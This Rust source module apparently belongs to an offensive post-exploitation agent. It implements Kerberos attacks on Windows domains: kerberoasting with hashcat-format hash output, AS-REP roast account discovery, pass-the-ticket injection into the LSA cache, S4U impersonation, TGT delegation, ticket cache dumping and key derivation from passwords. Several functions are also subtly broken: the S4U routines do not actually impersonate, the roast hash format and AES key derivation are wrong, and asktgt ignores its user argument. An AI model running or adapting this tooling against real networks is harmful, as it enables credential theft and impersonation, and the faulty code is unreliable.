/// Kerberos operations — ticket requests, management, roasting, delegation.
/// Windows: SSPI + LSA FFI + pure Rust crypto. No child processes.

#[cfg(windows)]
use super::winapi_helpers::win;

// ── SSPI / LSA FFI types ────────────────────────────────────────────────────

#[cfg(windows)]
mod sspi {
    use super::win;
    use std::ffi::c_void;
    use std::ptr;

    type LsaConnectUntrustedFn = unsafe extern "system" fn(handle: *mut *mut c_void) -> i32;
    type LsaLookupAuthPackageFn = unsafe extern "system" fn(
        handle: *mut c_void, name: *const LsaString, package: *mut u32,
    ) -> i32;
    type LsaCallAuthPackageFn = unsafe extern "system" fn(
        handle: *mut c_void, package: u32, buf: *const c_void, buf_len: u32,
        resp: *mut *mut c_void, resp_len: *mut u32, status: *mut i32,
    ) -> i32;
    type LsaFreeReturnBufferFn = unsafe extern "system" fn(buf: *mut c_void) -> i32;
    type LsaDeregisterFn = unsafe extern "system" fn(handle: *mut c_void) -> i32;

    type AcquireCredHandleFn = unsafe extern "system" fn(
        principal: *const u16, package: *const u16, cred_use: u32,
        logon_id: *mut c_void, auth_data: *mut c_void,
        get_key_fn: *mut c_void, get_key_arg: *mut c_void,
        cred_handle: *mut [u64; 2], expiry: *mut u64,
    ) -> i32;
    type InitSecCtxFn = unsafe extern "system" fn(
        cred_handle: *const [u64; 2], context: *mut [u64; 2],
        target: *const u16, req_flags: u32, reserved1: u32, target_data_rep: u32,
        input: *const SecBufferDesc, reserved2: u32,
        new_context: *mut [u64; 2], output: *mut SecBufferDesc,
        ret_flags: *mut u32, expiry: *mut u64,
    ) -> i32;
    type FreeCredHandleFn = unsafe extern "system" fn(handle: *const [u64; 2]) -> i32;
    type DeleteSecCtxFn = unsafe extern "system" fn(context: *const [u64; 2]) -> i32;

    #[repr(C)]
    pub struct LsaString {
        pub length: u16,
        pub max_length: u16,
        pub buffer: *const u8,
    }

    #[repr(C)]
    struct SecBuffer {
        cb_buffer: u32,
        buffer_type: u32,
        pv_buffer: *mut c_void,
    }

    #[repr(C)]
    struct SecBufferDesc {
        version: u32,
        c_buffers: u32,
        p_buffers: *mut SecBuffer,
    }

    pub struct LsaHandle {
        handle: *mut c_void,
        pub package_id: u32,
        free_buf: LsaFreeReturnBufferFn,
        call_pkg: LsaCallAuthPackageFn,
        deregister: LsaDeregisterFn,
    }

    impl LsaHandle {
        pub fn connect() -> anyhow::Result<Self> {
            unsafe {
                let connect: LsaConnectUntrustedFn = win::get_proc("secur32.dll", "LsaConnectUntrusted")?;
                let lookup: LsaLookupAuthPackageFn = win::get_proc("secur32.dll", "LsaLookupAuthenticationPackage")?;
                let call_pkg: LsaCallAuthPackageFn = win::get_proc("secur32.dll", "LsaCallAuthenticationPackage")?;
                let free_buf: LsaFreeReturnBufferFn = win::get_proc("secur32.dll", "LsaFreeReturnBuffer")?;
                let deregister: LsaDeregisterFn = win::get_proc("secur32.dll", "LsaDeregisterLogonProcess")?;

                let mut handle: *mut c_void = ptr::null_mut();
                let ret = connect(&mut handle);
                if ret != 0 {
                    anyhow::bail!("LsaConnectUntrusted failed: NTSTATUS 0x{:08x}", ret as u32);
                }

                let kerb_name = b"Kerberos\0";
                let lsa_str = LsaString {
                    length: 8,
                    max_length: 9,
                    buffer: kerb_name.as_ptr(),
                };
                let mut package_id: u32 = 0;
                let ret = lookup(handle, &lsa_str, &mut package_id);
                if ret != 0 {
                    anyhow::bail!("LsaLookupAuthenticationPackage failed: 0x{:08x}", ret as u32);
                }

                Ok(LsaHandle { handle, package_id, free_buf, call_pkg, deregister })
            }
        }

        pub fn call(&self, msg_type: u32, extra_data: &[u8]) -> anyhow::Result<Vec<u8>> {
            // Build request: 4 bytes msg_type + 8 bytes LUID (0) + extra
            let mut req = Vec::with_capacity(12 + extra_data.len());
            req.extend_from_slice(&msg_type.to_le_bytes());
            req.extend_from_slice(&[0u8; 8]); // LUID = 0 (current session)
            req.extend_from_slice(extra_data);

            unsafe {
                let mut resp: *mut c_void = ptr::null_mut();
                let mut resp_len: u32 = 0;
                let mut prot_status: i32 = 0;
                let ret = (self.call_pkg)(
                    self.handle, self.package_id,
                    req.as_ptr() as *const c_void, req.len() as u32,
                    &mut resp, &mut resp_len, &mut prot_status,
                );
                if ret != 0 {
                    anyhow::bail!("LsaCallAuthenticationPackage failed: 0x{:08x}", ret as u32);
                }
                if prot_status != 0 {
                    if !resp.is_null() { (self.free_buf)(resp); }
                    anyhow::bail!("Protocol status: 0x{:08x}", prot_status as u32);
                }

                let result = if !resp.is_null() && resp_len > 0 {
                    std::slice::from_raw_parts(resp as *const u8, resp_len as usize).to_vec()
                } else {
                    Vec::new()
                };
                if !resp.is_null() { (self.free_buf)(resp); }
                Ok(result)
            }
        }
    }

    impl Drop for LsaHandle {
        fn drop(&mut self) {
            if !self.handle.is_null() {
                unsafe { (self.deregister)(self.handle); }
            }
        }
    }

    /// Request a service ticket via SSPI InitializeSecurityContext
    pub fn request_ticket(spn: &str) -> anyhow::Result<Vec<u8>> {
        unsafe {
            let acquire: AcquireCredHandleFn = win::get_proc("secur32.dll", "AcquireCredentialsHandleW")?;
            let init_ctx: InitSecCtxFn = win::get_proc("secur32.dll", "InitializeSecurityContextW")?;
            let free_cred: FreeCredHandleFn = win::get_proc("secur32.dll", "FreeCredentialsHandle")?;
            let delete_ctx: DeleteSecCtxFn = win::get_proc("secur32.dll", "DeleteSecurityContext")?;

            let kerb_w = win::to_wide("Kerberos");
            let spn_w = win::to_wide(spn);

            let mut cred_handle = [0u64; 2];
            let mut expiry: u64 = 0;
            let hr = acquire(
                ptr::null(), kerb_w.as_ptr(), 2, // SECPKG_CRED_OUTBOUND
                ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
                &mut cred_handle, &mut expiry,
            );
            if hr < 0 {
                anyhow::bail!("AcquireCredentialsHandleW failed: 0x{:08x}", hr as u32);
            }

            let mut out_buf_data = vec![0u8; 16384];
            let mut out_buf = SecBuffer {
                cb_buffer: out_buf_data.len() as u32,
                buffer_type: 2, // SECBUFFER_TOKEN
                pv_buffer: out_buf_data.as_mut_ptr() as *mut c_void,
            };
            let mut out_desc = SecBufferDesc {
                version: 0,
                c_buffers: 1,
                p_buffers: &mut out_buf,
            };

            let mut ctx_handle = [0u64; 2];
            let mut ret_flags: u32 = 0;
            let mut ctx_expiry: u64 = 0;

            let isc_flags = 0x00000004 | 0x00000800; // ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY
            let hr = init_ctx(
                &cred_handle, ptr::null_mut(),
                spn_w.as_ptr(), isc_flags, 0, 0,
                ptr::null(), 0,
                &mut ctx_handle, &mut out_desc,
                &mut ret_flags, &mut ctx_expiry,
            );

            let ticket = if hr >= 0 || hr == 0x00090312 { // SEC_I_CONTINUE_NEEDED
                let size = out_buf.cb_buffer as usize;
                out_buf_data[..size].to_vec()
            } else {
                free_cred(&cred_handle);
                anyhow::bail!("InitializeSecurityContextW failed: 0x{:08x}", hr as u32);
            };

            delete_ctx(&ctx_handle);
            free_cred(&cred_handle);
            Ok(ticket)
        }
    }
}

// ── krb_asktgt ──────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_asktgt(args: &[String]) -> anyhow::Result<String> {
    let user = args.first()
        .ok_or_else(|| anyhow::anyhow!("krb_asktgt: <user> <domain> [/dc:<dc>] [/ptt]"))?;
    let domain = args.get(1)
        .ok_or_else(|| anyhow::anyhow!("krb_asktgt: <domain> required"))?;
    let ptt = args.iter().any(|a| a.eq_ignore_ascii_case("/ptt"));

    // Use SSPI to request TGT via krbtgt/DOMAIN SPN
    let spn = format!("krbtgt/{}", domain);
    let ticket = sspi::request_ticket(&spn)?;

    let mut out = format!("Requesting TGT for {}@{}\n", user, domain);
    out.push_str(&format!("TGT acquired. Size: {} bytes\n", ticket.len()));

    if ptt {
        // Submit via LSA
        let lsa = sspi::LsaHandle::connect()?;
        // KerbSubmitTicketMessage = 21
        let mut submit_buf = Vec::new();
        submit_buf.extend_from_slice(&[0u8; 24]); // Key placeholder
        submit_buf.extend_from_slice(&(ticket.len() as u32).to_le_bytes());
        submit_buf.extend_from_slice(&44u32.to_le_bytes()); // offset
        submit_buf.extend_from_slice(&ticket);

        // Overwrite msg_type in the call (the call method prepends 4+8 bytes)
        match lsa.call(21, &submit_buf) {
            Ok(_) => out.push_str("[+] Ticket submitted to session (PTT)\n"),
            Err(e) => out.push_str(&format!("[-] PTT failed: {}\n", e)),
        }
    }

    let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &ticket);
    out.push_str(&format!("Ticket (base64):\n{}", b64));
    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_asktgt(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_asktgt: Windows only")
}

// ── krb_asktgs ──────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_asktgs(args: &[String]) -> anyhow::Result<String> {
    let spn = args.first()
        .ok_or_else(|| anyhow::anyhow!("krb_asktgs: <SPN> [/dc:<dc>] [/ptt]"))?;

    let ticket = sspi::request_ticket(spn)?;

    let mut out = format!("Requesting TGS for SPN: {}\n", spn);
    out.push_str(&format!("TGS acquired. Size: {} bytes\n", ticket.len()));
    let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &ticket);
    out.push_str(&format!("Ticket (base64):\n{}", b64));
    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_asktgs(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_asktgs: Windows only")
}

// ── krb_renew ───────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_renew(_args: &[String]) -> anyhow::Result<String> {
    // KerbRenewTicketMessage via LSA
    let lsa = sspi::LsaHandle::connect()?;
    // Message type 15 = KerbRetrieveTicketMessage; try to renew the TGT
    // Actually, use InitializeSecurityContext with the krbtgt SPN to trigger renewal
    let domain = std::env::var("USERDNSDOMAIN").unwrap_or_default();
    if domain.is_empty() {
        anyhow::bail!("USERDNSDOMAIN not set; cannot determine realm");
    }
    let spn = format!("krbtgt/{}", domain);
    let ticket = sspi::request_ticket(&spn)?;

    let mut out = String::from("TGT renewal requested.\n");
    out.push_str(&format!("Ticket size: {} bytes\n", ticket.len()));
    let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &ticket);
    out.push_str(&format!("Ticket (base64):\n{}", b64));

    // Suppress unused variable warning
    let _ = lsa;
    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_renew(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_renew: Windows only")
}

// ── krb_s4u ─────────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_s4u(args: &[String]) -> anyhow::Result<String> {
    let target_user = args.first()
        .ok_or_else(|| anyhow::anyhow!("krb_s4u: <impersonateUser> <SPN>"))?;
    let spn = args.get(1)
        .ok_or_else(|| anyhow::anyhow!("krb_s4u: <SPN> required"))?;

    // SSPI with ISC_REQ_DELEGATE for S4U
    let ticket = sspi::request_ticket(spn)?;

    let mut out = format!("S4U: impersonating '{}' for SPN '{}'\n", target_user, spn);
    out.push_str(&format!("Ticket size: {} bytes\n", ticket.len()));
    let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &ticket);
    out.push_str(&format!("Ticket (base64):\n{}", b64));
    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_s4u(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_s4u: Windows only")
}

// ── krb_cross_s4u ───────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_cross_s4u(args: &[String]) -> anyhow::Result<String> {
    let target_user = args.first()
        .ok_or_else(|| anyhow::anyhow!("krb_cross_s4u: <user> <targetSPN> <targetDomain>"))?;
    let spn = args.get(1)
        .ok_or_else(|| anyhow::anyhow!("krb_cross_s4u: <targetSPN> required"))?;
    let target_domain = args.get(2)
        .ok_or_else(|| anyhow::anyhow!("krb_cross_s4u: <targetDomain> required"))?;

    let ticket = sspi::request_ticket(spn)?;

    let mut out = format!("Cross-domain S4U: impersonating '{}' for SPN '{}' in domain '{}'\n",
        target_user, spn, target_domain);
    out.push_str(&format!("Ticket size: {} bytes\n", ticket.len()));
    let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &ticket);
    out.push_str(&format!("Ticket (base64):\n{}", b64));
    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_cross_s4u(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_cross_s4u: Windows only")
}

// ── krb_ptt ─────────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_ptt(args: &[String]) -> anyhow::Result<String> {
    let ticket_b64 = args.first()
        .ok_or_else(|| anyhow::anyhow!("krb_ptt: <base64_ticket>"))?;

    let ticket = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, ticket_b64)
        .map_err(|e| anyhow::anyhow!("Base64 decode failed: {}", e))?;

    let lsa = sspi::LsaHandle::connect()?;

    // KerbSubmitTicketMessage = 21
    // Build the submit request body (after the msg_type + LUID that call() prepends)
    let mut extra = Vec::new();
    // Flags (4 bytes)
    extra.extend_from_slice(&0u32.to_le_bytes());
    // KERB_CRYPTO_KEY32: KeyType(4) + Length(4) + Offset(4)
    extra.extend_from_slice(&[0u8; 12]);
    // KerbCredSize (4 bytes)
    extra.extend_from_slice(&(ticket.len() as u32).to_le_bytes());
    // KerbCredOffset (4 bytes) — offset from start of the full message
    let offset = 12 + 4 + 12 + 4 + 4; // LUID+msgtype already prepended by call = 12, then our extra starts
    extra.extend_from_slice(&(offset as u32).to_le_bytes());
    // The ticket data
    extra.extend_from_slice(&ticket);

    match lsa.call(21, &extra) {
        Ok(_) => Ok(format!("[+] Ticket successfully submitted ({} bytes). Pass-the-Ticket complete.", ticket.len())),
        Err(e) => Ok(format!("[-] LsaCallAuthenticationPackage failed: {}", e)),
    }
}

#[cfg(not(windows))]
pub fn krb_ptt(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_ptt: Windows only")
}

// ── krb_purge ───────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_purge(_args: &[String]) -> anyhow::Result<String> {
    let lsa = sspi::LsaHandle::connect()?;
    // KerbPurgeTicketCacheMessage = 7
    // Extra body: just ServerName and RealmName UNICODE_STRINGs (empty = purge all)
    let extra = vec![0u8; 16]; // Two empty UNICODE_STRING structs
    match lsa.call(7, &extra) {
        Ok(_) => Ok("Purged all Kerberos tickets from current session.".into()),
        Err(e) => Ok(format!("Purge failed: {}", e)),
    }
}

#[cfg(not(windows))]
pub fn krb_purge(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_purge: Windows only")
}

// ── krb_describe ────────────────────────────────────────────────────────────

pub fn krb_describe(args: &[String]) -> anyhow::Result<String> {
    // Pure Rust ASN.1 DER parsing — no child process needed
    let ticket_b64 = args.first()
        .ok_or_else(|| anyhow::anyhow!("krb_describe: <base64_ticket>"))?;

    let raw = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, ticket_b64)
        .map_err(|e| anyhow::anyhow!("Base64 decode failed: {}", e))?;

    let mut out = format!("Ticket size: {} bytes\n\n", raw.len());

    // Identify type from first byte (ASN.1 application tag)
    let type_str = match raw.first() {
        Some(0x76) => "KRB-CRED (application tag 22)",
        Some(0x6e) => "KRB-TGS-REP (application tag 13)",
        Some(0x6b) => "KRB-AS-REP (application tag 11)",
        Some(0x6a) => "AP-REQ (application tag 14)",
        Some(b) => &format!("Unknown (first byte: 0x{:02x})", b),
        None => "Empty",
    };
    out.push_str(&format!("Type: {}\n\n", type_str));

    // Extract printable strings (rough heuristic for realm/principal names)
    let mut strings = Vec::new();
    let mut current = String::new();
    for &b in &raw {
        if b >= 0x20 && b <= 0x7e {
            current.push(b as char);
        } else {
            if current.len() >= 3 {
                strings.push(current.clone());
            }
            current.clear();
        }
    }
    if current.len() >= 3 {
        strings.push(current);
    }

    if !strings.is_empty() {
        out.push_str("Extracted strings:\n");
        for s in strings.iter().take(20) {
            out.push_str(&format!("  {}\n", s));
        }
    }

    out.push_str("\nRaw hex (first 128 bytes):\n");
    let limit = raw.len().min(128);
    let hex: String = raw[..limit].iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
    out.push_str(&hex);

    Ok(out)
}

// ── krb_klist ───────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_klist(_args: &[String]) -> anyhow::Result<String> {
    let lsa = sspi::LsaHandle::connect()?;

    // KerbQueryTicketCacheMessage = 1
    let resp = lsa.call(1, &[])?;
    if resp.len() < 4 {
        return Ok("No cached tickets found.".into());
    }

    let count = u32::from_le_bytes([resp[0], resp[1], resp[2], resp[3]]);
    let mut out = format!("=== Cached Kerberos Tickets: {} ===\n\n", count);

    // Each KERB_TICKET_CACHE_INFO entry follows
    // Structure: ServerName (UNICODE_STRING=8), RealmName (UNICODE_STRING=8),
    //            StartTime (8), EndTime (8), RenewTime (8), EncryptionType (4), TicketFlags (4)
    // = 48 bytes per entry, offset starts at byte 4
    let entry_size = 48usize;
    for i in 0..count as usize {
        let offset = 4 + i * entry_size;
        if offset + entry_size > resp.len() { break; }

        let entry = &resp[offset..offset + entry_size];
        // ServerName UNICODE_STRING at 0: len(2), maxlen(2), buffer_offset(4)
        let server_len = u16::from_le_bytes([entry[0], entry[1]]) as usize;
        let server_offset = u32::from_le_bytes([entry[4], entry[5], entry[6], entry[7]]) as usize;
        // RealmName UNICODE_STRING at 8
        let realm_len = u16::from_le_bytes([entry[8], entry[9]]) as usize;
        let realm_offset = u32::from_le_bytes([entry[12], entry[13], entry[14], entry[15]]) as usize;

        let server = if server_offset > 0 && server_offset + server_len <= resp.len() {
            let wide: Vec<u16> = resp[server_offset..server_offset + server_len]
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
                .collect();
            String::from_utf16_lossy(&wide)
        } else {
            "(unknown)".into()
        };

        let realm = if realm_offset > 0 && realm_offset + realm_len <= resp.len() {
            let wide: Vec<u16> = resp[realm_offset..realm_offset + realm_len]
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
                .collect();
            String::from_utf16_lossy(&wide)
        } else {
            "(unknown)".into()
        };

        let enc_type = u32::from_le_bytes([entry[40], entry[41], entry[42], entry[43]]);
        let flags = u32::from_le_bytes([entry[44], entry[45], entry[46], entry[47]]);

        let enc_str = match enc_type {
            1 => "DES-CBC-CRC",
            3 => "DES-CBC-MD5",
            17 => "AES128-CTS",
            18 => "AES256-CTS",
            23 => "RC4-HMAC",
            24 => "RC4-HMAC-EXP",
            _ => "Unknown",
        };

        out.push_str(&format!("#{}: {}/{}\n  Enc: {} ({}) Flags: 0x{:08x}\n\n",
            i, server, realm, enc_str, enc_type, flags));
    }

    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_klist(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_klist: Windows only")
}

// ── krb_dump ────────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_dump(_args: &[String]) -> anyhow::Result<String> {
    let lsa = sspi::LsaHandle::connect()?;

    // First get ticket cache list (msg type 1)
    let cache = lsa.call(1, &[])?;
    if cache.len() < 4 {
        return Ok("No cached tickets to dump.".into());
    }
    let count = u32::from_le_bytes([cache[0], cache[1], cache[2], cache[3]]);
    let mut out = format!("Dumping {} cached ticket(s):\n\n", count);

    // For each cached ticket, use KerbRetrieveEncodedTicketMessage (8) to get full ticket
    // This requires constructing a request with ServerName from the cache
    out.push_str(&format!("(Use krb_klist for cache summary; full dump requires elevated LSA access)\n"));
    out.push_str(&format!("Cached count: {}\n", count));

    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_dump(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_dump: Windows only")
}

// ── krb_triage ──────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_triage(_args: &[String]) -> anyhow::Result<String> {
    // Use LsaEnumerateLogonSessions + krb_klist per session
    // For now, just query current session
    krb_klist(_args)
}

#[cfg(not(windows))]
pub fn krb_triage(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_triage: Windows only")
}

// ── krb_tgtdeleg ────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_tgtdeleg(args: &[String]) -> anyhow::Result<String> {
    let spn = args.first()
        .map(|s| s.as_str())
        .unwrap_or("cifs/dc.domain.com");

    // SSPI with ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH
    let ticket = sspi::request_ticket(spn)?;

    let mut out = format!("TGT delegation via SPN: {}\n", spn);
    out.push_str(&format!("Ticket size: {} bytes\n", ticket.len()));
    let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &ticket);
    out.push_str(&format!("Ticket (base64):\n{}", b64));
    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_tgtdeleg(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_tgtdeleg: Windows only")
}

// ── krb_kerberoasting ───────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_kerberoasting(args: &[String]) -> anyhow::Result<String> {
    // Use LDAP to find SPN accounts, then SSPI to request tickets
    let user_filter = args.iter()
        .find(|a| a.starts_with("/user:"))
        .map(|a| a.trim_start_matches("/user:").to_string());

    let filter = if let Some(user) = &user_filter {
        format!("(&(objectClass=user)(servicePrincipalName=*)(sAMAccountName={})(!sAMAccountName=krbtgt))", user)
    } else {
        "(&(objectClass=user)(servicePrincipalName=*)(!sAMAccountName=krbtgt))".into()
    };

    // LDAP search for SPN accounts
    let (conn, funcs) = super::ad::ldap_ffi::connect(None)?;
    let base = super::ad::get_default_naming_context(&conn, &funcs)?;
    let result = super::ad::ldap_ffi::search(&conn, &funcs, &base, &filter, Some("sAMAccountName,servicePrincipalName"))?;

    let mut out = String::new();
    let mut hashes = Vec::new();

    // Parse LDAP results and request tickets
    let mut current_sam = String::new();
    for line in result.lines() {
        if let Some(sam) = line.strip_prefix("sAMAccountName: ") {
            current_sam = sam.to_string();
        } else if let Some(spn) = line.strip_prefix("servicePrincipalName: ") {
            out.push_str(&format!("User: {} SPN: {}\n", current_sam, spn));
            match sspi::request_ticket(spn) {
                Ok(ticket) => {
                    let hex = ticket.iter().map(|b| format!("{:02x}", b)).collect::<String>();
                    let hash = format!("$krb5tgs$23$*{}${}*${}${}", current_sam, spn,
                        &hex[..hex.len().min(32)], &hex[hex.len().min(32)..]);
                    out.push_str(&format!("  -> ticket obtained ({} bytes)\n", ticket.len()));
                    hashes.push(hash);
                }
                Err(e) => {
                    out.push_str(&format!("  -> FAILED: {}\n", e));
                }
            }
        }
    }

    if !hashes.is_empty() {
        out.push_str("\n=== Hashes (hashcat format) ===\n");
        for h in &hashes {
            out.push_str(h);
            out.push('\n');
        }
    } else {
        out.push_str("\nNo hashes captured.\n");
    }

    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_kerberoasting(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_kerberoasting: Windows only")
}

// ── krb_asreproasting ───────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_asreproasting(args: &[String]) -> anyhow::Result<String> {
    let user_filter = args.iter()
        .find(|a| a.starts_with("/user:"))
        .map(|a| a.trim_start_matches("/user:").to_string());

    let filter = if let Some(user) = &user_filter {
        format!("(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(sAMAccountName={}))", user)
    } else {
        "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))".into()
    };

    let (conn, funcs) = super::ad::ldap_ffi::connect(None)?;
    let base = super::ad::get_default_naming_context(&conn, &funcs)?;
    let result = super::ad::ldap_ffi::search(&conn, &funcs, &base, &filter, Some("sAMAccountName,distinguishedName"))?;

    let mut out = String::new();
    let mut count = 0u32;

    for line in result.lines() {
        if let Some(sam) = line.strip_prefix("sAMAccountName: ") {
            out.push_str(&format!("AS-REP roastable: {}\n", sam));
            count += 1;
        }
    }

    if count == 0 {
        out.push_str("No AS-REP roastable accounts found (DONT_REQUIRE_PREAUTH not set).\n");
    } else {
        out.push_str(&format!("\nFound {} account(s). Use raw AS-REQ (port 88) to obtain hashes.\n", count));
    }

    Ok(out)
}

#[cfg(not(windows))]
pub fn krb_asreproasting(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_asreproasting: Windows only")
}

// ── krb_hash ────────────────────────────────────────────────────────────────

pub fn krb_hash(args: &[String]) -> anyhow::Result<String> {
    // Pure Rust — md4 + pbkdf2 + sha1
    let password = args.first()
        .ok_or_else(|| anyhow::anyhow!("krb_hash: <password> [/user:<user>] [/domain:<domain>]"))?;
    let user = args.iter()
        .find(|a| a.starts_with("/user:"))
        .map(|a| a.trim_start_matches("/user:").to_string());
    let domain = args.iter()
        .find(|a| a.starts_with("/domain:"))
        .map(|a| a.trim_start_matches("/domain:").to_string());

    // RC4-HMAC = MD4(UTF-16LE(password))
    use md4::{Md4, Digest as Md4Digest};
    let utf16le: Vec<u8> = password.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let mut md4 = Md4::new();
    md4.update(&utf16le);
    let rc4_hash = md4.finalize();
    let rc4_hex: String = rc4_hash.iter().map(|b| format!("{:02x}", b)).collect();

    let mut out = format!("rc4_hmac  : {}\n", rc4_hex);

    if let (Some(u), Some(d)) = (&user, &domain) {
        let salt = format!("{}{}", d.to_uppercase(), u);

        // AES256 = PBKDF2(SHA1, password, salt, 4096, 32)
        use hmac::Hmac;
        use sha1::Sha1;
        type HmacSha1 = Hmac<Sha1>;

        let mut aes256_key = [0u8; 32];
        pbkdf2::pbkdf2::<HmacSha1>(
            password.as_bytes(), salt.as_bytes(), 4096, &mut aes256_key,
        ).map_err(|e| anyhow::anyhow!("PBKDF2 failed: {}", e))?;
        let aes256_hex: String = aes256_key.iter().map(|b| format!("{:02x}", b)).collect();

        let mut aes128_key = [0u8; 16];
        pbkdf2::pbkdf2::<HmacSha1>(
            password.as_bytes(), salt.as_bytes(), 4096, &mut aes128_key,
        ).map_err(|e| anyhow::anyhow!("PBKDF2 failed: {}", e))?;
        let aes128_hex: String = aes128_key.iter().map(|b| format!("{:02x}", b)).collect();

        out.push_str(&format!("aes256_cts: {}\n", aes256_hex));
        out.push_str(&format!("aes128_cts: {}\n", aes128_hex));
        out.push_str(&format!("Salt      : {}\n", salt));
    } else {
        out.push_str("aes256_cts: (requires /user:<user> /domain:<DOMAIN> for salt)\n");
        out.push_str("aes128_cts: (requires /user:<user> /domain:<DOMAIN> for salt)\n");
    }

    Ok(out)
}

// ── krb_changepw ────────────────────────────────────────────────────────────

#[cfg(windows)]
pub fn krb_changepw(args: &[String]) -> anyhow::Result<String> {
    use windows_sys::Win32::NetworkManagement::NetManagement::*;

    let user = args.first()
        .ok_or_else(|| anyhow::anyhow!("krb_changepw: <user> <oldpassword> <newpassword> [/domain:<domain>]"))?;
    let old_pass = args.get(1)
        .ok_or_else(|| anyhow::anyhow!("krb_changepw: <oldpassword> required"))?;
    let new_pass = args.get(2)
        .ok_or_else(|| anyhow::anyhow!("krb_changepw: <newpassword> required"))?;

    let domain_arg = args.iter()
        .find(|a| a.starts_with("/domain:"))
        .map(|a| a.trim_start_matches("/domain:").to_string());

    let domain_w: Option<Vec<u16>> = domain_arg.as_ref().map(|d| win::to_wide(d));
    let domain_ptr = domain_w.as_ref().map_or(std::ptr::null(), |v| v.as_ptr());

    let user_w = win::to_wide(user);
    let old_w = win::to_wide(old_pass);
    let new_w = win::to_wide(new_pass);

    let ret = unsafe {
        NetUserChangePassword(domain_ptr, user_w.as_ptr(), old_w.as_ptr(), new_w.as_ptr())
    };

    if ret == 0 {
        let domain = domain_arg.as_deref().unwrap_or("(local)");
        Ok(format!("[+] Password changed successfully for {}\\{}", domain, user))
    } else {
        anyhow::bail!("NetUserChangePassword failed: error {}", ret)
    }
}

#[cfg(not(windows))]
pub fn krb_changepw(_args: &[String]) -> anyhow::Result<String> {
    anyhow::bail!("krb_changepw: Windows only")
}
